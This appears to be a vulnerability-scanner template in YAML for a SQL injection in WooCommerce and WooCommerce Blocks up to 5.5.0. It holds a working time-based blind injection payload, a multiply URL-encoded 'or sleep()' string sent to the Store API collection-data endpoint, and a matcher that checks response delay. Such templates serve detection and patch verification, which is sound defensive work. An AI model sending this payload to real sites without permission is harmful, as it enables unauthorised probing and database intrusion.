id: sqli_woocommerce

info:
  name: SQL Injection in WooCommerce and WooCommerce Blocks <= 5.5.0
  author: cookiehanhoan
  severity: High
  description: https://woocommerce.com/posts/critical-vulnerability-detected-july-2021/, https://www.facebook.com/cookie.han.hoan

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=and&calculate_attribute_counts[0][taxonomy]=cookiehanhoan%252522%252529%252520or%252520sleep%2525280%25252e1%252529%252520or%252520%252528%252522"
    matchers:
          - type: dsl
            dsl:
              - "duration>=1"